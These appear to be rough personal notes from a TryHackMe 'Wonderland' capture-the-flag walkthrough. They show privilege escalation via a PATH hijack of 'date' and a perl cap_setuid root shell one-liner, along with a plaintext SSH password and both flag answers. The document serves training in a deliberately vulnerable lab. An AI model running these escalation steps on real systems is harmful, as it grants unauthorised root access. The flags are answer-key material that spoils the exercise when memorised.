

```
Welcome to the tea party!
The Mad Hatter will be here soon.

/bin/echo -n 'Probably by ' && date --date='next hour' -R

Ask very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)8
```


```
export PATH=/tmp:$PATH

echo $PATH
```

As you can we have elevated to another user as well
date 
```
#!/bin/bash 
/bin/bash
```
![[Pasted image 20231101234737.png]]

the connection got closed so have to run everything again will do it tomorrow.
We got some thing sus and it seems password
```
WhyIsARavenLikeAWritingDesk?
```
![[Pasted image 20231102142513.png]]

Yes the password is for hatter as i was able to make a ssh login through it 
```
hatter
WhyIsARavenLikeAWritingDesk?
```
Let's run the linpeas again as i have seem something with root and hatter permission

Now i think the usr txt is in the tryhackme folder and we already have the root.txt in alice but don't have the priv to see the content.

Let's say where this journey take us.

There is something related to perl we got this earlier as well but was not able to run but i think now we can escalate.
```
/usr/bin/perl = cap_setuid+ep

/usr/bin/perl5.26.1 = cap_setuid+ep

/home/hatter/.bash_history
```
![[Pasted image 20231102144134.png]]

I told that i was not able to recall the permission but here we have hater.
let's open GTFOBINS and see what we can do

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
With little tweaks in the command we got something
![[Pasted image 20231102144256.png]]

I was wrong and the user.txt was in the root folder
```
thm{"Curiouser and curiouser!"}
```
![[Pasted image 20231102144416.png]]

Let's read the root file we already know where it is
```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```
![[Pasted image 20231102144559.png]]
